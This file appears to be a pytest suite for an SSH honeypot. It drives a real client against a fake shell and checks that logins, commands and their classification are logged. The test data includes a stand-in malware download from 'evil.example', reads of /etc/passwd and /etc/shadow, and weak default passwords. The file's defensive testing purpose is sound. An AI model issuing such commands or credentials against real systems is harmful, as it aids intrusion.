"""
Tests for Member 3: the SSH decoy and the fake shell.
A real SSH server is started on a free port and a real paramiko client attacks it.
"""
import socket
import threading
import time
from pathlib import Path

import bcrypt
import paramiko
import pytest

from conftest import ROOT, clear_database, free_port, query
from app.core.config import Config
from app.decoy_ssh.shell import ShellSimulator


@pytest.fixture(scope='module')
def ssh_port():
    port = free_port()
    Config.SSH_PORT = port
    Config.SSH_HOST = '127.0.0.1'
    from app.decoy_ssh.server import run_ssh_decoy
    stop = threading.Event()
    thread = threading.Thread(target=run_ssh_decoy, kwargs={'stop_event': stop}, daemon=True)
    thread.start()
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            socket.create_connection(('127.0.0.1', port), timeout=0.5).close()
            break
        except OSError:
            time.sleep(0.1)
    yield port
    stop.set()
    thread.join(timeout=5)


@pytest.fixture
def attack(ssh_port, clean_db):
    clients = []

    def connect(user='root', password='root'):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect('127.0.0.1', ssh_port, user, password, look_for_keys=False, allow_agent=False, timeout=10)
        clients.append(client)
        return client
    yield connect
    for c in clients:
        c.close()


def wait_for(condition, timeout=5.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if condition():
            return True
        time.sleep(0.1)
    return False


def shell_run(client, commands, delay=0.4):
    channel = client.invoke_shell()
    time.sleep(0.6)
    output = b''
    for command in commands:
        channel.send(command + '\r')
        time.sleep(delay)
        while channel.recv_ready():
            output += channel.recv(65535)
    return channel, output.decode('utf-8', 'ignore')


# --- Login ---------------------------------------------------------------

def test_banner_looks_like_ubuntu_openssh(ssh_port):
    with socket.create_connection(('127.0.0.1', ssh_port), timeout=5) as s:
        assert s.recv(256).startswith(b'SSH-2.0-OpenSSH_8.9p1 Ubuntu')


def test_wrong_password_is_rejected_and_logged_hashed(attack):
    with pytest.raises(paramiko.AuthenticationException):
        attack('root', 'NotOnTheList!')
    assert wait_for(lambda: query('SELECT * FROM auth_attempts'))
    row = query('SELECT * FROM auth_attempts')[0]
    assert row['username'] == 'root' and row['success'] == 0 and row['auth_method'] == 'password'
    assert row['password_hash'] != 'NotOnTheList!'
    assert bcrypt.checkpw(b'NotOnTheList!', row['password_hash'].encode())


def test_weak_password_lets_attacker_in(attack):
    attack('admin', 'admin')
    assert wait_for(lambda: query('SELECT success FROM auth_attempts'))
    assert query('SELECT success FROM auth_attempts')[0]['success'] == 1


# --- Commands ------------------------------------------------------------

def test_interactive_commands_are_captured_and_classified(attack):
    client = attack('root', '123456')
    _, output = shell_run(client, ['whoami', 'wget http://evil.example/malware', 'cat /etc/passwd'])
    assert 'root@' in output and '#' in output
    assert 'failed: Temporary failure in name resolution' in output
    assert wait_for(lambda: len(query('SELECT * FROM interactions')) == 3)
    rows = query('SELECT command, command_classification, fake_output FROM interactions ORDER BY interaction_id')
    assert [(r['command'], r['command_classification']) for r in rows] == [
        ('whoami', 'recon'), ('wget http://evil.example/malware', 'download'), ('cat /etc/passwd', 'recon')]
    assert rows[0]['fake_output'] == 'root'


def test_one_line_exec_command_is_captured(attack):
    client = attack('ubuntu', 'ubuntu')
    _, stdout, _ = client.exec_command('uname -a', timeout=5)
    assert 'Linux' in stdout.read().decode()
    assert stdout.channel.recv_exit_status() == 0
    assert wait_for(lambda: query("SELECT command FROM interactions WHERE command = 'uname -a'"))


def test_arrow_keys_and_backspace_do_not_corrupt_commands(attack):
    client = attack()
    shell_run(client, ['\x1b[A\x1b[Bwhoamx\x7fi'])
    assert wait_for(lambda: query('SELECT command FROM interactions'))
    assert query('SELECT command FROM interactions')[0]['command'] == 'whoami'


def test_exit_closes_session(attack):
    client = attack()
    channel, output = shell_run(client, ['exit'])
    assert 'logout' in output
    assert wait_for(lambda: query('SELECT ended_at FROM sessions')[0]['ended_at'] is not None)


def test_client_version_is_recorded(attack):
    attack()
    assert wait_for(lambda: (query('SELECT ssh_client_version FROM sessions') or [{}])[0].get('ssh_client_version'))
    assert query('SELECT ssh_client_version FROM sessions')[0]['ssh_client_version'].startswith('SSH-2.0-paramiko')


def test_session_closed_even_when_login_fails(attack):
    with pytest.raises(paramiko.AuthenticationException):
        attack('root', 'wrong')
    assert wait_for(lambda: query('SELECT ended_at FROM sessions WHERE ended_at IS NOT NULL'), timeout=40)


def test_ip_is_enriched(attack):
    attack()
    assert wait_for(lambda: query('SELECT country_code FROM ip_intel'))
    assert query('SELECT country_code FROM ip_intel')[0]['country_code'] == 'RESERVED'


def test_idle_session_is_logged_out(attack):
    from app.core.session import get_session_manager
    manager = get_session_manager()
    old = manager.idle_timeout
    manager.idle_timeout = 1
    try:
        client = attack()
        channel = client.invoke_shell()
        assert wait_for(lambda: channel.closed or channel.exit_status_ready(), timeout=8)
    finally:
        manager.idle_timeout = old
    assert wait_for(lambda: query('SELECT ended_at FROM sessions')[0]['ended_at'] is not None)
    assert query('SELECT duration_seconds FROM sessions')[0]['duration_seconds'] < 8


def test_idle_loop_does_not_burn_cpu(attack):
    """The old loop spun at 100% CPU while waiting for input."""
    client = attack()
    client.invoke_shell()
    time.sleep(0.5)
    before = time.process_time()
    time.sleep(2)
    used = time.process_time() - before
    assert used < 0.5, f'used {used:.2f}s of CPU in 2s while idle'


# --- Fake shell (no network needed) ---------------------------------------

def test_shell_never_runs_real_commands():
    """No code in app/ can start a process or evaluate attacker text."""
    import re
    source = '\n'.join(p.read_text(encoding='utf-8') for p in (ROOT / 'app').rglob('*.py'))
    for pattern in (r'\bsubprocess\b', r'\bos\.(system|popen|exec\w*|spawn\w*)\b', r'(?<![\w.])eval\(',
                    r'(?<![\w.])exec\(', r'\bpty\.spawn\b', r'\bimport\s+pty\b'):
        assert not re.search(pattern, source), pattern


def test_shell_has_more_than_30_commands():
    shell = ShellSimulator()
    commands = ['whoami', 'id', 'hostname', 'pwd', 'uname -a', 'date', 'uptime', 'w', 'who', 'last', 'ls',
                'cat /etc/passwd', 'echo hi', 'ps aux', 'top', 'ifconfig', 'ip a', 'netstat -an', 'env', 'df -h',
                'free -m', 'nproc', 'lscpu', 'lsb_release -a', 'history', 'crontab -l', 'which python3',
                'wget http://x/y', 'curl http://x', 'git clone http://x/y', 'ping 10.0.0.1', 'python3 -V',
                'apt install x', 'systemctl restart x', 'su', 'passwd', 'useradd x', 'find / -name x', 'mysql']
    for command in commands:
        assert 'command not found' not in shell.process_command(command)[0], command


def test_cd_changes_prompt_and_pwd():
    shell = ShellSimulator(username='ubuntu')
    shell.process_command('cd /tmp')
    assert shell.process_command('pwd')[0] == '/tmp'
    assert shell.get_prompt().endswith(':/tmp$ ')
    assert 'No such file' in shell.process_command('cd /nope')[0]


def test_hostname_is_consistent_everywhere():
    shell = ShellSimulator(hostname='web-server-02')
    assert shell.process_command('hostname')[0] == 'web-server-02'
    assert 'web-server-02' in shell.process_command('cat /etc/hosts')[0]
    assert 'web-server-02' in shell.process_command('uname -a')[0]


def test_pipes_and_chains():
    shell = ShellSimulator()
    assert shell.process_command('cat /etc/passwd | grep root')[0] == 'root:x:0:0:root:/root:/bin/bash'
    assert shell.process_command('cat /etc/passwd | wc -l')[0] == '9'
    assert shell.process_command('whoami; id')[0].startswith('ubuntu\nuid=1000')


def test_root_and_normal_user_look_different():
    assert ShellSimulator(username='root').process_command('id')[0] == 'uid=0(root) gid=0(root) groups=0(root)'
    user = ShellSimulator(username='ubuntu')
    assert 'Permission denied' in user.process_command('cat /etc/shadow')[0]
    assert 'not in the sudoers file' in user.process_command('sudo su')[0]


def test_output_is_capped():
    shell = ShellSimulator(max_output=50)
    assert len(shell.process_command('cat /etc/passwd')[0]) == 50
